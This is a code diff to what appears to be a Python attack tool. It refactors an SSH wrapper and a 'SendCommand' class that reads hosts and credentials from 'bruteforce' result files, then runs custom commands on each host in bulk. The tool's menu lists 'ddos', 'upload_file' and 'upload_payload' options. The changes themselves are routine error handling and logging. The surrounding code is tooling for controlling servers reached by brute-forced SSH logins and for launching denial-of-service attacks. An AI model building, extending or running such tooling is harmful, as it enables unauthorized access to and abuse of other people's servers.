@@ -19,7 +19,8 @@ class SSH(object):
             self.client.connect(hostname=kw.get('hostname'), username=kw.get('username'),
                                 password=kw.get('password'), port=kw.get('port', '22'))
         except Exception as e:
-            raise Exception(e)
+            # Required set logging here.
+            print('Error while connecting to the server.', e)
 
         return self
 
@@ -27,13 +28,10 @@ class SSH(object):
         self.client.close()
 
     def exec_cmd(self, cmd):
-        _, stdout, stderr = self.client.exec_command(cmd)
-        data = stdout.read()
+        _, stdout, _ = self.client.exec_command(cmd)
+        data = stdout.read().decode()
 
-        if stderr:
-            raise stderr
-
-        return data.decode('utf-8')
+        return data
 
     def transmit_file(self, local, remote):
         sftp = self.client.open_sftp()
@@ -55,23 +53,25 @@ class SendCommand(object):
             '3': self.upload_file,
             '4': self.ddos,
         }
-        self.directory = utils.get_path_to_dir('bruteforce')
+        self.brute_dir = utils.get_path_to_dir('bruteforce')
+        self.sendcmd_dir = utils.get_path_to_dir('sendcommand')
         self.hosts_dirs = utils.show_results_files('bruteforce', '22_')
         self.cmd = None
+        self.log = 'N'
 
     @decorators.ssh_output
-    def exec_custom_cmd(self, seq):
-        # Need log decorator for logging output.
-        # ! set in try block because if no connect to server - app drop.
+    def exec_custom_cmd(self, seq, cmd, log='N'):
         for el in list(seq):
             with SSH(**el) as ssh:
-                output = ssh.exec_cmd(self.cmd)
+                output = ssh.exec_cmd(cmd)
 
-                yield output, 'exec_custom_cmd_{}.log', self.cmd
+            file = self.sendcmd_dir + '/exec_custom_cmd.log'
+
+            return output, file, cmd, el['hostname'], log.lower()
 
     def send_custom_command(self):
-        choice, self.cmd = uix.send_command_custom_cmd(self.hosts_dirs)
-        file = utils.get_file_from_dir(self.directory, self.hosts_dirs, choice, 'filtered_result')
+        choice, cmd, log = uix.send_command_custom_cmd(self.hosts_dirs)
+        file = utils.get_file_from_dir(self.brute_dir, self.hosts_dirs, choice, 'filtered_result')
         lines_count = utils.count_lines(file)
         ranges = utils.split_on_ranges(lines_count, 10) if lines_count > 100 else None
 
@@ -81,7 +81,7 @@ class SendCommand(object):
 
         else:
             # Exec custom command for each host in file.
-            self.exec_custom_cmd(utils.create_dict_data(utils.read_file(file)))
+            self.exec_custom_cmd(utils.create_dict_data(utils.read_file(file)), cmd, log)
 
     def upload_payload(self):
         pass
